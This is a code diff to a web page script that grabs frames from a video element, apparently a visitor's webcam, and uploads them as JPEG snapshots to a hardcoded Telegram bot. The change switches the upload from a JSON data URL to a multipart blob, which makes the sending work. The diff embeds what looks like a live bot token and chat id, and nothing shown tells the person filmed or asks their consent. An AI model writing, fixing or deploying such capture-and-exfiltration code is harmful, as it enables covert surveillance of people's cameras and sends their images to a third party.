@@ -30,33 +30,25 @@
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            const imageData = canvas.toDataURL('image/jpeg');
-            sendToTelegram(imageData);
-        }
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', '5125698617');
+                formData.append('photo', blob, 'snapshot.jpg');
 
-        function sendToTelegram(imageData) {
-            const telegramBotToken = '6279713413:AAEmPVpjxZROtRY9kjSysmSskrG3OrbuiWw';
-            const chatId = '5125698617';
-
-            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    photo: imageData
+                fetch(`https://api.telegram.org/bot6279713413:AAEmPVpjxZROtRY9kjSysmSskrG3OrbuiWw/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
                 })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (!data.ok) {
-                    console.error("Error sending photo to Telegram: ", data);
-                }
-            })
-            .catch(err => {
-                console.error("Error sending photo to Telegram: ", err);
-            });
+                .then(response => response.json())
+                .then(data => {
+                    if (!data.ok) {
+                        console.error("Error sending photo to Telegram: ", data);
+                    }
+                })
+                .catch(err => {
+                    console.error("Error sending photo to Telegram: ", err);
+                });
+            }, 'image/jpeg');
         }
     </script>
 </body>
